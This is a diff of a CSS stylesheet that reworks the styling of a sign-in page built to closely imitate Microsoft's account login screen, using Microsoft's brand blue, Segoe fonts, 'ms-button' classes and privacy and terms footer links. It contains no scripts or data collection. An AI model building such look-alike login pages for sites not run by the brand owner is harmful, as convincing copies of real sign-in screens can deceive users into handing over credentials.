@@ -6,13 +6,13 @@ body {
     background-attachment: fixed;
 
     font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math", serif;
-    margin: 0; /* Убираем отступы по умолчанию */
-    height: 100vh; /* Высота body равна высоте окна браузера */
+    margin: 0;
+    height: 100vh;
 }
 
 main#app {
     display: flex;
-    flex-direction: column; /* Располагаем элементы по вертикали */
+    flex-direction: column;
     align-items: center;
     min-height: 100vh;
     justify-content: center;
@@ -31,28 +31,44 @@ main#app {
     min-width: 320px;
     min-height: 338px;
     overflow: hidden;
-    margin: 0; /* Убираем внешние отступы */
+    margin: 0;
 }
-.sing-in-title{
+
+.sing-in-title {
     font-size: 1.5rem;
     font-weight: 600;
     color: #1b1b1b;
     line-height: 1.75rem;
-    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math", serif;
 }
 
-/* Новые стили для sign-in-options */
+.form-group,.cant-access{
+    font-size: 13px;
+    margin-bottom: 16px;
+    width: 100%;
+}
+.form-group {
+    margin-bottom: 13px;
+}
+.create-account,.cant-access{
+    text-decoration: none;
+    color:#0067b8;
+}
+.create-account:hover,.cant-access:hover{
+    text-decoration: underline;
+}
+
 .sign-in-options {
     display: flex;
-    margin: 20px auto 0 auto; /* Отступ сверху и центрирование */
+    margin: 20px auto 0 auto;
     max-width: 440px;
     width: calc(100% - 40px);
     background-color: #fff;
     box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
     min-width: 320px;
-    cursor:pointer;
+    cursor: pointer;
     height: 48px;
-    padding:  8px 44px 8px 44px;
+    padding: 8px 44px 8px 44px;
 }
 
 .sign-in-options > div {
@@ -75,10 +91,39 @@ main#app {
 
 }
 
+.ms-button.back {
+    line-height: normal;
+    text-overflow: ellipsis;
+    background-color: rgb(204, 204, 204);
+    color: #000;
+    border: 2px solid rgb(204, 204, 204);
+    margin-right: 5px;
+    font-weight: 400;
+}
+
+.ms-button.back:hover {
+    background-color: rgb(170, 170, 170);
+    border-color: rgb(170, 170, 170);
+}
+
+.sign-in-options:hover {
+    background-color: rgb(229, 229, 229);
+}
+
+.ms-button.back:focus {
+    outline: 2px solid rgb(170, 170, 170);
+    outline-offset: 2px;
+}
+
+.ms-button.back:active {
+    background-color: rgb(136, 136, 136);
+    border-color: rgb(136, 136, 136);
+}
+
 * {
     box-sizing: border-box;
 }
-/* Общие стили для всех кнопок */
+
 .btn, button, input[type='button'], input[type='submit'], input[type='reset'] {
     margin-top: 0;
     margin-bottom: 0;
@@ -86,51 +131,115 @@ main#app {
     min-width: 108px;
     padding: 4px 12px;
     font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", sans-serif;
-    font-size: 0.9375rem; /* 15px */
-    line-height: 1.25rem; /* 20px */
-    font-weight: 600; /* Жирный текст */
-    cursor: pointer; /* Указатель при наведении */
-    transition: background-color 0.3s ease, border-color 0.3s ease; /* Плавные переходы */
-    display: inline-flex; /* Позволяет центрировать содержимое */
-    align-items: center; /* Центрирование по вертикали */
-    justify-content: center; /* Центрирование по горизонтали */
+    font-size: 0.9375rem;
+    line-height: 1.25rem;
+    font-weight: 400;
+    cursor: pointer;
+    transition: background-color 0.3s ease, border-color 0.3s ease;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
     text-align: center;
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
     touch-action: manipulation;
-    color: #fff; /* Белый текст по умолчанию */
-    background-color: #0067b8; /* Фирменный синий цвет */
-    border: 2px solid #0067b8; /* Синяя граница */
+    color: #fff;
+    background-color: #0067b8;
+    border: 2px solid #0067b8;
 }
+
 .button-container {
     display: flex;
     justify-content: flex-end;
     width: 100%;
 }
 
-
-
-/* Специфичные стили для кнопки "Next" */
 .ms-button {
-    width: auto; /* Ширина 100% контейнера */
+    width: auto;
 }
 
-/* Состояние при наведении */
 .ms-button:hover {
-    background-color: #005A9E; /* Затемнённый синий */
-    border-color: #005A9E; /* Затемнённая граница */
+    background-color: #005A9E;
+    border-color: #005A9E;
 }
 
-/* Состояние при фокусе */
 .ms-button:focus {
-    outline: 2px solid #005A9E; /* Контур при фокусе */
+    outline: 2px solid #005A9E;
     outline-offset: 2px;
 }
 
-/* Состояние при нажатии */
 .ms-button:active {
-    background-color: #004578; /* Ещё более затемнённый синий */
-    border-color: #004578; /* Ещё более затемнённая граница */
+    background-color: #004578;
+    border-color: #004578;
 }
+
+footer {
+    position: absolute;
+    left: 0;
+    bottom: 0;
+    width: 100%;
+    overflow: visible;
+    z-index: 99;
+    clear: both;
+    min-height: 28px;
+    display: flex;
+    justify-content: flex-end;
+
+    .footer-more, .footer-privacy, .footer-terms {
+        margin: 0 8px;
+        color: #000;
+        font-size: 12px;
+        line-height: 28px;
+        white-space: nowrap;
+        cursor: pointer;
+    }
+
+    .footer-privacy:hover, .footer-terms:hover {
+        text-decoration: underline;
+    }
+
+    .footer-more {
+        text-decoration: none;
+        letter-spacing: 3px;
+        line-height: 22px;
+        vertical-align: top;
+        font-size: 16px;
+        font-weight: 600;
+    }
+}
+
+
+.input-text {
+    width: 100%;
+    padding:  6px 10px 6px 0;
+    border: none;
+    border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+    background-color: transparent;
+    outline: none;
+    box-sizing: border-box;
+    text-overflow: ellipsis;
+    margin-right: 5px;
+
+    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math", serif;
+    font-style: normal;
+    font-weight: 400;
+    color: #1b1b1b;
+    font-size: 15px;
+    line-height: 20px;
+}
+
+.input::placeholder {
+    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math", serif;
+    font-style: normal;
+    font-weight: 400;
+    color: #1b1b1b;
+    font-size: 15px;
+    line-height: 20px;
+}
+
+.input-text:focus {
+    border-bottom-color: #0067b8; /* Цвет фокуса в стиле Microsoft */
+}
+
 
